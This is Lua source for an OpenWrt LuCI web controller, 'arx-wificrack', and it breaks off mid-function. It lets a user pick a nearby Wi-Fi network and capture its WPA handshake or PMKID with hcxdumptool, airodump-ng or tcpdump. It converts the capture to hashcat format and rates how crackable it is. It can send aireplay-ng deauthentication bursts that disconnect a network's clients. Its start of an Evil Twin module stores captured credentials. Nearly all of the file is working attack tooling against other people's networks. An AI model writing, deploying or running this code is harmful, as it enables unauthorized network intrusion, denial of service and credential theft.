local sys = require "luci.sys"
local http = require "luci.http"
local nixio = require "nixio"

module("luci.controller.arx.wificrack", package.seeall)

do
	local pid = (nixio.getpid and nixio.getpid()) or 0
	math.randomseed((os.time() % 2147483647) + (pid % 65536) * 17 + 12345)
end

local CAPTURE_DIR  = "/tmp/arx-wificrack"
local HISTORY_DIR  = "/tmp/arx-wificrack/history"
local PCAP_FILE    = CAPTURE_DIR .. "/capture.pcapng"
local HASH_FILE    = CAPTURE_DIR .. "/capture.22000"
local PID_FILE     = CAPTURE_DIR .. "/capture.pid"
local LOG_FILE     = CAPTURE_DIR .. "/capture.log"
local TOOL_FILE    = CAPTURE_DIR .. "/tool.txt"
local INFO_FILE    = CAPTURE_DIR .. "/target_info.txt"
local TIMEOUT_FILE = CAPTURE_DIR .. "/timeout.txt"

local ET_DIR    = "/tmp/arx-et"
local ET_STATUS = ET_DIR .. "/status.txt"

local function et_is_running()
	if not nixio.fs.access(ET_STATUS) then return false end
	local f = io.open(ET_STATUS, "r"); if not f then return false end
	local s = f:read("*l"); f:close()
	return s == "running"
end

function index()
	if not nixio.fs.access("/etc/config/arx-wificrack") then return end
	entry({"admin","arx-wificrack"}, alias("admin","arx-wificrack","capture"), _("WiFi 抓包"), 50).dependent = false
	entry({"admin","arx-wificrack","capture"},   template("arx-wificrack/capture"),    _("握手包捕获"), 10).leaf = true
	entry({"admin","arx-wificrack","evil_twin"}, template("arx-wificrack/evil_twin"),  _("Evil Twin"), 20).leaf = true
	entry({"admin","arx-wificrack","scan"},      call("action_scan")).leaf = true
	entry({"admin","arx-wificrack","start"},     call("action_start")).leaf = true
	entry({"admin","arx-wificrack","stop"},      call("action_stop")).leaf = true
	entry({"admin","arx-wificrack","status"},    call("action_status")).leaf = true
	entry({"admin","arx-wificrack","download"},  call("action_download")).leaf = true
	entry({"admin","arx-wificrack","delete"},    call("action_delete")).leaf = true
	entry({"admin","arx-wificrack","tools"},     call("action_tools")).leaf = true
	entry({"admin","arx-wificrack","deauth"},    call("action_deauth")).leaf = true
	entry({"admin","arx-wificrack","history"},   call("action_history")).leaf = true
	entry({"admin","arx-wificrack","history_dl"},call("action_history_dl")).leaf = true
	entry({"admin","arx-wificrack","history_rm"},call("action_history_rm")).leaf = true
	entry({"admin","arx-wificrack","verify"},    call("action_verify")).leaf = true
	-- Evil Twin API
	entry({"admin","arx-wificrack","et_start"},  call("action_et_start")).leaf = true
	entry({"admin","arx-wificrack","et_stop"},   call("action_et_stop")).leaf = true
	entry({"admin","arx-wificrack","et_status"}, call("action_et_status")).leaf = true
	entry({"admin","arx-wificrack","et_creds"},  call("action_et_creds")).leaf = true
	entry({"admin","arx-wificrack","et_creds_rm"},call("action_et_creds_rm")).leaf = true
end

-- ==================== 输入验证 ====================

-- [C1/C2/H1] 验证 MAC 地址格式，防止命令注入
local function validate_mac(mac)
	if not mac then return false end
	return mac:match("^%x%x:%x%x:%x%x:%x%x:%x%x:%x%x$") ~= nil
end

-- [C1] 验证信道号：0 表示不指定信道（airodump 扫描所有信道），1-196 为合法信道
local function validate_channel(ch)
	local n = tonumber(ch)
	return n and n >= 0 and n <= 196
end

-- [C3] 验证历史记录文件名（白名单：仅允许字母数字、连字符、下划线）
local function validate_name(name)
	if not name or name == "" then return false end
	return name:match("^[%w%-_]+$") ~= nil
end

-- ==================== 工具函数 ====================

local function detect_tools()
	local tools = {}
	if sys.exec("which hcxdumptool 2>/dev/null"):match("%S") then
		table.insert(tools, {id="hcxdumptool", name="hcxdumptool", desc="自动 PMKID+deauth，hashcat 官方推荐"})
	end
	if sys.exec("which airodump-ng 2>/dev/null"):match("%S") then
		table.insert(tools, {id="airodump", name="airodump-ng", desc="经典工具，支持指定信道，可配合 deauth"})
	end
	if sys.exec("which tcpdump 2>/dev/null"):match("%S") then
		table.insert(tools, {id="tcpdump", name="tcpdump", desc="系统自带，被动监听，无需 monitor mode"})
	end
	return tools
end

local function get_current_tool()
	local f = io.open(TOOL_FILE, "r")
	if f then local t = f:read("*l"); f:close(); if t and t~="" then return t end end
	if sys.exec("which hcxdumptool 2>/dev/null"):match("%S") then return "hcxdumptool" end
	if sys.exec("which airodump-ng 2>/dev/null"):match("%S") then return "airodump" end
	return "tcpdump"
end

local function get_wifi_iface()
	local iface = sys.exec("iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -1"):gsub("%s+$","")
	-- H-4: 允许字母数字、连字符、下划线、点（覆盖 phy0-ap0、wlan0.1 等合法命名）
	-- 仍拒绝空字符串、斜杠、分号等 shell 特殊字符
	if iface == "" or not iface:match("^[%w%.%-_]+$") then return "wlan0" end
	return iface
end

local function is_running()
	if not nixio.fs.access(PID_FILE) then return false end
	local f = io.open(PID_FILE,"r"); if not f then return false end
	local pid = f:read("*l"); f:close()
	if not pid or pid=="" then return false end
	-- 确保 pid 是纯数字，防止路径注入
	if not pid:match("^%d+$") then return false end
	return nixio.fs.access("/proc/"..pid) and true or false
end

local function read_info()
	local t = {ssid="",bssid="",channel="0",start="0",tool=get_current_tool(),timeout="300"}
	local f = io.open(INFO_FILE,"r")
	if f then
		for line in f:lines() do
			local k,v = line:match("^(%w+)=(.*)$")
			if k then t[k]=v end
		end
		f:close()
	end
	return t
end

-- 解析 hcxdumptool 日志，提取 PMKID/EAPOL 计数
local function parse_capture_stats()
	local pmkid, eapol = 0, 0
	if not nixio.fs.access(LOG_FILE) then return pmkid, eapol end
	-- [M2] 直接 io.open 读取，避免高频轮询时 fork cat 子进程
	local lf = io.open(LOG_FILE, "r")
	if lf then
		local log = lf:read("*a") or ""
		lf:close()
		for n in log:gmatch("PMKID[^%d]*(%d+)") do pmkid = tonumber(n) or pmkid end
		for n in log:gmatch("EAPOL[^%d]*(%d+)") do eapol = tonumber(n) or eapol end
	end
	-- 也从 .22000 文件统计
	if nixio.fs.access(HASH_FILE) then
		local p, e = 0, 0
		local hf = io.open(HASH_FILE,"r")
		if hf then
			for line in hf:lines() do
				if line:match("^WPA%*01%*") then p = p+1
				elseif line:match("^WPA%*02%*") then e = e+1 end
			end
			hf:close()
		end
		if p+e > 0 then return p, e end
	end
	return pmkid, eapol
end

-- 保存到历史记录
local function save_to_history(info)
	os.execute("mkdir -p "..HISTORY_DIR)
	if not nixio.fs.access(HASH_FILE) then return end
	local ts = os.time()
	local raw_ssid = (info.ssid or ""):sub(1, 32)
	local safe_ssid = raw_ssid:gsub("[^%w%-_]","_")
	if safe_ssid == "" or safe_ssid:match("^_+$") then safe_ssid = "unknown" end
	-- B-1: 时间戳 + SSID + PID + 随机数，避免同进程同秒内碰撞
	local pid = (nixio.getpid and nixio.getpid()) or 0
	local name = string.format("%d_%s_%d_%05d", ts, safe_ssid, pid, math.random(99999))
	os.execute(string.format("cp %s %s/%s.22000 2>/dev/null", HASH_FILE, HISTORY_DIR, name))
	local mf = io.open(HISTORY_DIR.."/"..name..".info","w")
	if mf then
		mf:write(string.format("ssid=%s\nbssid=%s\ntool=%s\ntime=%d\n",
			info.ssid or "", info.bssid or "", info.tool or "", ts))
		mf:close()
	end
end

-- ==================== API ====================

function action_tools()
	http.prepare_content("application/json")
	-- [S3] 仅在 POST 时执行写操作，且对工具名做白名单校验
	if http.getenv("REQUEST_METHOD") == "POST" then
		local sel = http.formvalue("set")
		if sel == "hcxdumptool" or sel == "airodump" or sel == "tcpdump" then
			local f = io.open(TOOL_FILE,"w"); if f then f:write(sel); f:close() end
		end
	end
	http.write_json({tools=detect_tools(), current=get_current_tool()})
end

-- [HIGH-2] 扫描锁文件，防止并发扫描同时执行
local SCAN_LOCK = CAPTURE_DIR .. "/scan.lock"

function action_scan()
	http.prepare_content("application/json")
	if et_is_running() then http.write_json({error="Evil Twin 运行中，请先停止后再扫描"}); return end
	if is_running() then http.write_json({error="正在抓包中，请先停止后再扫描"}); return end
	-- 防止并发扫描：检查锁文件（mtime 超过 30 秒视为过期）
	if nixio.fs.access(SCAN_LOCK) then
		local st = nixio.fs.stat(SCAN_LOCK)
		local age = st and (os.time() - (st.mtime or 0)) or 999
		if age < 30 then
			http.write_json({error="扫描进行中，请稍候"}); return
		end
	end
	os.execute("mkdir -p "..CAPTURE_DIR)
	-- L-5: 锁文件过期判断依赖 mtime，内容无需写入时间戳
	local lf = io.open(SCAN_LOCK, "w"); if lf then lf:close() end

	local networks = {}
	local iface = ""
	local ok, scan_err = pcall(function()
		iface = get_wifi_iface()
		local scan_raw = sys.exec(string.format("iw dev %s scan 2>/dev/null", iface))
		local cur = {}
		for line in scan_raw:gmatch("[^\n]+") do
			local bss = line:match("^BSS ([%x:]+)")
			if bss then
				if cur.bssid then
					local chn = tonumber(cur.channel) or 0
					cur.band = (chn > 14) and "5" or "2.4"
					table.insert(networks, cur)
				end
				cur = {bssid=bss, ssid="", signal=0, channel=0, security="OPEN"}
			elseif cur.bssid then
				local ssid = line:match("^%s+SSID: (.+)")
				-- [M7] 对 SSID 做基本清理，移除控制字符
				if ssid then cur.ssid = ssid:gsub("[%c]", "") end
				local sig  = line:match("^%s+signal: ([%-%.%d]+)"); if sig then cur.signal=tonumber(sig) or 0 end
				local ch   = line:match("DS Parameter set: channel (%d+)"); if ch then cur.channel=tonumber(ch) or 0 end
				if line:match("RSN:") then cur.security="WPA2" end
				if line:match("%s+WPA:") and cur.security=="OPEN" then cur.security="WPA" end
			end
		end
		if cur.bssid then
			local chn = tonumber(cur.channel) or 0
			cur.band = (chn > 14) and "5" or "2.4"
			table.insert(networks, cur)
		end
		table.sort(networks, function(a,b) return a.signal > b.signal end)
	end)

	nixio.fs.remove(SCAN_LOCK)
	if not ok then
		http.write_json({error="扫描失败: "..tostring(scan_err)})
		return
	end
	http.write_json({networks=networks, iface=iface})
end

function action_start()
	http.prepare_content("application/json")
	if et_is_running() then http.write_json({error="Evil Twin 运行中，请先停止"}); return end
	if is_running() then http.write_json({error="已在抓包中"}); return end

	local bssid   = http.formvalue("bssid") or ""
	local channel = http.formvalue("channel") or "0"
	local ssid    = (http.formvalue("ssid") or "unknown"):gsub("[%c]", ""):sub(1, 32)
	if ssid == "" then ssid = "unknown" end
	local tool    = http.formvalue("tool") or get_current_tool()
	local timeout = tonumber(http.formvalue("timeout")) or 300

	-- [C1] 验证 BSSID 格式
	if bssid == "" then http.write_json({error="请选择目标 WiFi"}); return end
	if not validate_mac(bssid) then http.write_json({error="BSSID 格式无效"}); return end

	-- [C1] 验证信道
	if not validate_channel(channel) then http.write_json({error="信道号无效"}); return end
	channel = tostring(math.floor(tonumber(channel)))

	-- 工具白名单
	if tool ~= "hcxdumptool" and tool ~= "airodump" and tool ~= "tcpdump" then
		tool = get_current_tool()
	end

	-- 超时范围限制
	if timeout < 0 then timeout = 0 end
	if timeout > 3600 then timeout = 3600 end

	os.execute("rm -f "..PCAP_FILE.." "..HASH_FILE.." "..LOG_FILE.." "..HASH_FILE..".converted")
	os.execute("mkdir -p "..CAPTURE_DIR)
	-- [M3] 清理上次 airodump 遗留的 .cap 文件，避免 action_stop 取到旧文件
	local old_dir = nixio.fs.dir(CAPTURE_DIR)
	if old_dir then
		for entry in old_dir do
			if entry:match("^airodump%-.*%.cap$") or entry:match("^airodump%-.*%.pcapng$") then
				nixio.fs.remove(CAPTURE_DIR.."/"..entry)
			end
		end
	end

	local tf = io.open(TOOL_FILE,"w"); if tf then tf:write(tool); tf:close() end

	-- 保存超时设置
	local tof = io.open(TIMEOUT_FILE,"w"); if tof then tof:write(tostring(timeout)); tof:close() end

	local iface = get_wifi_iface()
	local cmd = ""

	if tool=="hcxdumptool" then
		os.execute("wifi down 2>/dev/null; sleep 1")
		local filter = CAPTURE_DIR.."/target.txt"
		-- [C1] bssid 已验证格式，安全写入过滤文件
		local ff = io.open(filter,"w"); if ff then ff:write(bssid:gsub(":",""):lower().."\n"); ff:close() end
		-- [C1] iface 已在 get_wifi_iface() 中验证为纯字母数字，所有参数均为受控路径常量
		cmd = string.format(
			"hcxdumptool -i %s -w %s --filterlist_ap=%s --filtermode=2 --rds=1 >> %s 2>&1 & echo $! > %s",
			iface, PCAP_FILE, filter, LOG_FILE, PID_FILE)

	elseif tool=="airodump" then
		os.execute(string.format("airmon-ng start %s 2>/dev/null", iface))
		-- [HIGH-5] 遍历所有接口找真实 monitor 接口名，与 action_stop 逻辑保持一致
		local mon = iface.."mon"
		local iw_check = sys.exec("iw dev 2>/dev/null") or ""
		for ifn in iw_check:gmatch("Interface%s+(%S+)") do
			if ifn:match("mon$") and ifn:match("^[%w]+$") then mon = ifn; break end
		end
		local ch_num = tonumber(channel) or 0
		local ch_arg = ch_num > 0 and ("-c "..tostring(ch_num)) or ""
		if ch_num > 0 then
			os.execute(string.format("iw dev %s set channel %d 2>/dev/null", mon, ch_num))
		end
		-- [C1] bssid 已验证为 XX:XX:XX:XX:XX:XX 格式，mon 来自受控 iface
		cmd = string.format(
			"airodump-ng %s --bssid %s %s -w %s/airodump --output-format pcapng >> %s 2>&1 & echo $! > %s",
			mon, bssid, ch_arg, CAPTURE_DIR, LOG_FILE, PID_FILE)

	elseif tool=="tcpdump" then
		cmd = string.format(
			"tcpdump -i %s -w %s 'ether proto 0x888e' >> %s 2>&1 & echo $! > %s",
			iface, PCAP_FILE, LOG_FILE, PID_FILE)
	end

	if cmd=="" then http.write_json({error="工具不可用: "..tool}); return end
	os.execute(cmd)

	-- 写入目标信息
	local inf = io.open(INFO_FILE,"w")
	if inf then
		inf:write(string.format("ssid=%s\nbssid=%s\nchannel=%s\nstart=%d\ntool=%s\ntimeout=%d\n",
			ssid, bssid, channel, os.time(), tool, timeout))
		inf:close()
	end

	-- [CRIT-1] 超时后台进程：用 flock 与 action_stop 互斥；wifi up 仅在 hcxdumptool 模式执行
	-- B-2: 检查 hcxpcapngtool 是否可用，不可用时写入错误日志，避免静默失败
	local has_hcxpcapngtool = sys.exec("which hcxpcapngtool 2>/dev/null"):match("%S") ~= nil
	if timeout > 0 then
		local wifi_up_cmd = (tool == "hcxdumptool") and "wifi up 2>/dev/null;" or ""
		local conv_cmd
		if has_hcxpcapngtool then
			conv_cmd = "[ ! -f %s.converted ] && hcxpcapngtool %s -o %s 2>/dev/null && touch %s.converted; "
		else
			-- 未安装时不 touch .converted，便于安装工具后重试转换
			conv_cmd = "echo '[ERROR] hcxpcapngtool not found' >> " .. LOG_FILE .. "; echo hcxpcapngtool_missing >> " .. LOG_FILE .. "; "
		end
		if has_hcxpcapngtool then
			os.execute(string.format(
				"(sleep %d; flock /tmp/arx-wificrack-stop.lock sh -c '"
				.. "pid=$(cat %s 2>/dev/null); rm -f %s; "
				.. "[ -n \"$pid\" ] && { kill \"$pid\" 2>/dev/null; sleep 1; kill -9 \"$pid\" 2>/dev/null; }; "
				.. conv_cmd
				.. "%s') &",
				timeout, PID_FILE, PID_FILE,
				HASH_FILE, PCAP_FILE, HASH_FILE, HASH_FILE,
				wifi_up_cmd))
		else
			os.execute(string.format(
				"(sleep %d; flock /tmp/arx-wificrack-stop.lock sh -c '"
				.. "pid=$(cat %s 2>/dev/null); rm -f %s; "
				.. "[ -n \"$pid\" ] && { kill \"$pid\" 2>/dev/null; sleep 1; kill -9 \"$pid\" 2>/dev/null; }; "
				.. "%s"
				.. "%s') &",
				timeout, PID_FILE, PID_FILE,
				conv_cmd,
				wifi_up_cmd))
		end
	end

	local desc = {hcxdumptool="hcxdumptool（自动 PMKID+deauth）", airodump="airodump-ng（经典抓包）", tcpdump="tcpdump（被动监听）"}
	http.write_json({ok=true, message="开始抓包: "..ssid.."，使用 "..(desc[tool] or tool), iface=iface})
end

function action_stop()
	http.prepare_content("application/json")
	local info = read_info()

	-- [CRIT-2] 与超时任务同一把 flock，避免双 kill / PID 文件竞态（与 action_start 超时子 shell 一致）
	if is_running() then
		os.execute(string.format(
			"flock /tmp/arx-wificrack-stop.lock sh -c '"
			.. "pid=$(cat %s 2>/dev/null); rm -f %s; "
			.. "[ -n \"$pid\" ] && { kill \"$pid\" 2>/dev/null; sleep 1; kill -9 \"$pid\" 2>/dev/null; }'",
			PID_FILE, PID_FILE))
	end

	-- airodump：停 monitor mode，找输出文件
	if info.tool=="airodump" then
		local iface = get_wifi_iface()
		-- [H2] 先探测真实 monitor 接口名，再 stop，避免接口名不是 wlan0mon 时失败
		local mon_iface = nil
		local iw_devs = sys.exec("iw dev 2>/dev/null") or ""
		for ifn in iw_devs:gmatch("Interface%s+(%S+)") do
			if ifn:match("mon$") then mon_iface = ifn; break end
		end
		if mon_iface and mon_iface:match("^[%w]+$") then
			os.execute(string.format("airmon-ng stop %s 2>/dev/null", mon_iface))
		else
			os.execute(string.format("airmon-ng stop %smon 2>/dev/null", iface))
		end
		-- [MED-5] 用 nixio.fs.stat 的 mtime 字段（POSIX 标准），不再猜测备用字段名
		local cap_file = nil
		local best_mtime = 0
		local dir = nixio.fs.dir(CAPTURE_DIR)
		if dir then
			for entry in dir do
				if entry:match("^airodump%-.*%.cap$") or entry:match("^airodump%-.*%.pcapng$") then
					local path = CAPTURE_DIR.."/"..entry
					local st = nixio.fs.stat(path)
					local mt = (st and tonumber(st.mtime)) or 0
					if mt > best_mtime then
						best_mtime = mt
						cap_file = path
					end
				end
			end
		end
		if cap_file and nixio.fs.access(cap_file) then
			-- 使用 nixio 移动文件，避免 shell 引号问题
			nixio.fs.rename(cap_file, PCAP_FILE)
		end
	end

	-- [CRIT-1] 仅 hcxdumptool 模式执行了 wifi down，只在该模式下恢复
	-- [LOW-1] 移除无用的 wifi_rc 变量
	if info.tool == "hcxdumptool" then
		os.execute("wifi up 2>/dev/null")
	end
	-- 等待接口就绪（非 hcxdumptool 模式跳过等待）
	if info.tool == "hcxdumptool" then
		os.execute("sleep 2")
	end
	local wifi_ok = sys.exec("iw dev 2>/dev/null | grep -c Interface"):gsub("%s+$","")
	local wifi_recovered = (tonumber(wifi_ok) or 0) > 0

	local has_hcxpcapngtool = sys.exec("which hcxpcapngtool 2>/dev/null"):match("%S") ~= nil
	local conversion_error = nil
	local log_tail = ""
	if nixio.fs.access(LOG_FILE) then
		local lf = io.open(LOG_FILE, "r")
		if lf then
			log_tail = lf:read("*a") or ""
			lf:close()
		end
	end
	if log_tail:find("hcxpcapngtool_missing", 1, true) or log_tail:find("hcxpcapngtool not found", 1, true) then
		conversion_error = conversion_error or "hcxpcapngtool_missing"
	end

	-- 转换（用 flock 与超时进程互斥，并检查 .converted 标记避免重复覆盖）
	local converted = false
	if nixio.fs.access(PCAP_FILE) then
		if has_hcxpcapngtool then
			os.execute(string.format(
				"flock /tmp/arx-wificrack-stop.lock sh -c '"
				.. "[ ! -f %s.converted ] && hcxpcapngtool %s -o %s 2>/dev/null && touch %s.converted'",
				HASH_FILE, PCAP_FILE, HASH_FILE, HASH_FILE))
			converted = nixio.fs.access(HASH_FILE) and true or false
			if not converted then
				conversion_error = conversion_error or "conversion_failed"
			end
		else
			os.execute(string.format(
				"flock /tmp/arx-wificrack-stop.lock sh -c '"
				.. "echo hcxpcapngtool_missing >> %s; echo '[ERROR] hcxpcapngtool not found' >> %s'",
				LOG_FILE, LOG_FILE))
			conversion_error = "hcxpcapngtool_missing"
			converted = false
		end
	end

	local pmkid, eapol = parse_capture_stats()
	local total = pmkid + eapol

	-- 保存历史
	if converted and total > 0 then
		save_to_history(info)
	end

	local wifi_status = wifi_recovered and "WiFi 已恢复正常" or "⚠️ WiFi 未恢复，请尝试手动执行 wifi up 或重启设备"

	if converted and total > 0 then
		http.write_json({
			ok=true,
			message=string.format("抓包完成：PMKID %d 条，EAPOL 握手 %d 条", pmkid, eapol),
			has_file=true, pmkid=pmkid, eapol=eapol,
			wifi_status=wifi_status, wifi_recovered=wifi_recovered
		})
	else
		local msg = "已停止，未捕获到有效握手包"
		if conversion_error == "hcxpcapngtool_missing" then
			msg = msg .. "（未安装 hcxpcapngtool，无法从 pcap 生成 .22000；请安装 hcxtools 或手动转换）"
		elseif conversion_error == "conversion_failed" and nixio.fs.access(PCAP_FILE) then
			msg = msg .. "（hcxpcapngtool 已运行但未生成有效哈希，可能 pcap 中无握手/PMKID）"
		end
		http.write_json({
			ok=true, message=msg, has_file=false,
			wifi_status=wifi_status, wifi_recovered=wifi_recovered,
			conversion_error=conversion_error
		})
	end
end

-- deauth 攻击（仅 airodump 模式）
function action_deauth()
	http.prepare_content("application/json")
	if not sys.exec("which aireplay-ng 2>/dev/null"):match("%S") then
		http.write_json({error="aireplay-ng 未安装"}); return
	end

	local bssid  = http.formvalue("bssid") or ""
	local client = http.formvalue("client") or "FF:FF:FF:FF:FF:FF"
	local count  = tonumber(http.formvalue("count")) or 5

	-- [C2] 验证 BSSID 和 client MAC 格式
	if bssid == "" then http.write_json({error="缺少 BSSID"}); return end
	if not validate_mac(bssid) then http.write_json({error="BSSID 格式无效"}); return end
	if not validate_mac(client) then http.write_json({error="客户端 MAC 格式无效"}); return end

	-- count 范围限制
	if count < 1 then count = 1 end
	if count > 100 then count = 100 end

	local iface = get_wifi_iface()
	-- 与 airodump 流程一致：仅允许 monitor 接口，禁止回退到 STA 口以免 aireplay 行为不可预期
	local mon
	local iw_check = sys.exec("iw dev 2>/dev/null") or ""
	for ifn in iw_check:gmatch("Interface%s+(%S+)") do
		if ifn:match("mon$") and ifn:match("^[%w]+$") then mon = ifn; break end
	end
	if not mon then
		local cand = iface .. "mon"
		if cand:match("^[%w]+$") and sys.exec("iw dev " .. cand .. " info 2>/dev/null"):match("%S") then
			mon = cand
		end
	end
	if not mon then
		http.write_json({ error = "未找到 monitor 接口，请先通过 airodump 抓包流程进入监听模式" })
		return
	end

	-- [C2] bssid/client 已验证格式，count 已限制范围
	os.execute(string.format(
		"aireplay-ng -0 %d -a %s -c %s %s >> %s 2>&1 &",
		count, bssid, client, mon, LOG_FILE))

	http.write_json({ok=true, message=string.format("已发送 %d 个 deauth 帧到 %s", count, bssid)})
end

function action_status()
	http.prepare_content("application/json")
	local running  = is_running()
	local has_hash = nixio.fs.access(HASH_FILE) and true or false
	local has_pcap = nixio.fs.access(PCAP_FILE) and true or false
	local info     = read_info()

	local log = ""
	if nixio.fs.access(LOG_FILE) then
		-- [L2] 直接读文件末尾，避免高频轮询时 fork tail 子进程
		local lf = io.open(LOG_FILE, "r")
		if lf then
			local all = lf:read("*a") or ""
			lf:close()
			local lines = {}
			for l in all:gmatch("[^\r\n]+") do table.insert(lines, l) end
			local start = math.max(1, #lines - 9)
			local tail = {}
			for i = start, #lines do table.insert(tail, lines[i]) end
			log = table.concat(tail, "\n")
		end
	end

	local pcap_size = 0
	if has_pcap then
		local stat = nixio.fs.stat(PCAP_FILE); if stat then pcap_size=stat.size end
	end

	local pmkid, eapol = parse_capture_stats()

	-- 超时剩余时间
	local timeout_left = -1
	local timeout = tonumber(info.timeout) or 0
	if running and timeout > 0 then
		local elapsed = os.time() - (tonumber(info.start) or os.time())
		timeout_left = math.max(0, timeout - elapsed)
	end

	http.write_json({
		running      = running,
		has_hash     = has_hash,
		has_pcap     = has_pcap,
		pcap_size    = pcap_size,
		pmkid        = pmkid,
		eapol        = eapol,
		target       = info,
		log          = log,
		elapsed      = running and (os.time()-(tonumber(info.start) or os.time())) or 0,
		timeout_left = timeout_left,
		tools        = detect_tools(),
		current_tool = get_current_tool(),
	})
end

-- 验证握手包质量
function action_verify()
	http.prepare_content("application/json")
	-- Lua 中空字符串为真值，不能与 or HASH_FILE 混用，否则 base 为 nil 会崩溃
	local fv = http.formvalue("file")
	local file = (fv and fv ~= "") and fv or HASH_FILE

	-- [S2] 严格路径验证：先对文件名做白名单检查，再用 realpath 规范化
	-- 只允许 CAPTURE_DIR 或 HISTORY_DIR 下的 .22000 文件
	local base = file:match("([^/]+)$") or ""
	if not base:match("^[%w%-_]+%.22000$") then
		http.write_json({error="非法路径"}); return
	end
	-- 只允许来自已知目录
	local allowed = false
	if file == HASH_FILE then
		allowed = true
	elseif file:match("^/tmp/arx%-wificrack/history/[%w%-_]+%.22000$") then
		allowed = true
	end
	if not allowed then
		http.write_json({error="非法路径"}); return
	end
	-- 最终用 realpath 确认无路径穿越（无 realpath 时依赖白名单路径 + access）
	local real
	if type(nixio.fs.realpath) == "function" then
		real = nixio.fs.realpath(file)
		if not real then
			http.write_json({error="文件不存在"}); return
		end
	else
		if not nixio.fs.access(file) then
			http.write_json({error="文件不存在"}); return
		end
		real = file
	end
	if not real:match("^/tmp/arx%-wificrack/") then
		http.write_json({error="非法路径"}); return
	end

	if not nixio.fs.access(real) then
		http.write_json({error="文件不存在"}); return
	end

	local pmkid, eapol = 0, 0
	local hf = io.open(real,"r")
	if hf then
		for line in hf:lines() do
			if line:match("^WPA%*01%*") then pmkid=pmkid+1
			elseif line:match("^WPA%*02%*") then eapol=eapol+1 end
		end
		hf:close()
	end

	local quality, tip
	if eapol > 0 then
		quality = "excellent"
		tip = string.format("✅ 优质：包含 %d 条完整 EAPOL 握手（WPA*02），可直接用 hashcat 破解", eapol)
	elseif pmkid > 0 then
		quality = "good"
		tip = string.format("⚠️ 可用：包含 %d 条 PMKID（WPA*01），部分 AP 支持，建议尝试破解", pmkid)
	else
		quality = "empty"
		tip = "❌ 无效：文件中没有可用的握手记录"
	end

	http.write_json({pmkid=pmkid, eapol=eapol, quality=quality, tip=tip})
end

-- 历史记录列表
function action_history()
	http.prepare_content("application/json")
	os.execute("mkdir -p "..HISTORY_DIR)
	local records = {}
	-- [M3] 用 nixio.fs.dir 代替 ls glob，避免文件名含空格时解析错误
	local dir = nixio.fs.dir(HISTORY_DIR)
	if dir then
		for entry in dir do
			local name = entry:match("^(.+)%.22000$")
			if name then
				local path = HISTORY_DIR.."/"..entry
				local info = {name=name, ssid="", bssid="", tool="", time=0, pmkid=0, eapol=0}
				local mf = io.open(HISTORY_DIR.."/"..name..".info","r")
				if mf then
					for line in mf:lines() do
						local k,v = line:match("^(%w+)=(.*)$"); if k then info[k]=v end
					end
					mf:close()
				end
				info.time = tonumber(info.time) or 0
				-- 全文件统计 PMKID/EAPOL；极长文件设硬上限，避免单次请求耗时过长
				local MAX_HASH_LINES = 200000
				info.hash_stats_truncated = false
				local hf = io.open(path,"r")
				if hf then
					local n = 0
					for line in hf:lines() do
						n = n + 1
						if n > MAX_HASH_LINES then
							info.hash_stats_truncated = true
							break
						end
						if line:match("^WPA%*01%*") then info.pmkid=info.pmkid+1
						elseif line:match("^WPA%*02%*") then info.eapol=info.eapol+1 end
					end
					hf:close()
				end
				table.insert(records, info)
			end
		end
	end
	table.sort(records, function(a,b) return (tonumber(a.time) or 0) > (tonumber(b.time) or 0) end)
	http.write_json({records=records})
end

-- 下载历史文件
function action_history_dl()
	local name = http.formvalue("name") or ""
	-- [C3] 白名单验证文件名
	if not validate_name(name) then http.status(400,"Bad Request"); return end
	local path = HISTORY_DIR.."/"..name..".22000"
	if not nixio.fs.access(path) then http.status(404,"Not Found"); return end
	http.header("Content-Disposition", 'attachment; filename="'..name..'.22000"')
	http.prepare_content("application/octet-stream")
	local f = io.open(path,"rb"); if f then http.write(f:read("*a")); f:close() end
end

-- 删除历史文件
function action_history_rm()
	http.prepare_content("application/json")
	local name = http.formvalue("name") or ""
	-- [C3] 白名单验证文件名
	if not validate_name(name) then http.write_json({error="非法参数"}); return end
	-- [M5] 用 nixio.fs.remove 代替 os.execute shell，保持一致性
	nixio.fs.remove(HISTORY_DIR.."/"..name..".22000")
	nixio.fs.remove(HISTORY_DIR.."/"..name..".info")
	http.write_json({ok=true})
end

-- 下载当前文件
function action_download()
	if not nixio.fs.access(HASH_FILE) then http.status(404,"Not Found"); http.write("文件不存在"); return end
	local info = read_info()
	local ssid = (info.ssid or "capture"):gsub("[^%w%-_]","_")
	http.header("Content-Disposition", 'attachment; filename="'..ssid..'_hash.22000"')
	http.prepare_content("application/octet-stream")
	local f = io.open(HASH_FILE,"rb"); if f then http.write(f:read("*a")); f:close() end
end

-- 删除当前文件
function action_delete()
	http.prepare_content("application/json")
	if is_running() then http.write_json({error="请先停止抓包"}); return end
	-- L-3: 精确匹配已知文件名，避免 *.txt 通配误删未来新增的 txt 文件
	local known_files = {
		PCAP_FILE, HASH_FILE, LOG_FILE,
		TOOL_FILE, INFO_FILE, TIMEOUT_FILE,
		CAPTURE_DIR .. "/target.txt",
		HASH_FILE .. ".converted",
	}
	for _, path in ipairs(known_files) do
		nixio.fs.remove(path)
	end
	-- 同时清理 airodump 输出文件（动态命名）
	local dir = nixio.fs.dir(CAPTURE_DIR)
	if dir then
		for entry in dir do
			if entry:match("^airodump%-.*%.cap$") or entry:match("^airodump%-.*%.pcapng$") then
				nixio.fs.remove(CAPTURE_DIR.."/"..entry)
			end
		end
	end
	http.write_json({ok=true})
end

-- ==================== Evil Twin ====================

local ET_CREDS       = ET_DIR .. "/creds.txt"
local ET_LOG         = ET_DIR .. "/et.log"
local ET_AP_IFACE    = ET_DIR .. "/ap_iface.txt"
local ET_HANDSHAKE   = ET_DIR .. "/handshake.22000"
local ET_SUBMIT_ST   = ET_DIR .. "/submit_state.txt"
local ET_DEAUTH_PID  = ET_DIR .. "/deauth.pid"

local function et_read_status()
	if not nixio.fs.access(ET_STATUS) then return "stopped" end
	local f = io.open(ET_STATUS, "r"); if not f then return "stopped" end
	local s = f:read("*l"); f:close()
	return s or "stopped"
end

local function et_uci_opts()
	local max_rt, di, db = 1800, 5, 3
	local ok, umod = pcall(require, "luci.model.uci")
	if ok and umod and umod.cursor then
		local c = umod.cursor()
		local mr = tonumber(c:get("arx-wificrack", "evil_twin", "max_runtime"))
		if mr and mr >= 0 and mr <= 86400 then max_rt = mr end
		local d1 = tonumber(c:get("arx-wificrack", "evil_twin", "deauth_interval"))
		if d1 and d1 >= 2 and d1 <= 120 then di = d1 end
		local d2 = tonumber(c:get("arx-wificrack", "evil_twin", "deauth_burst"))
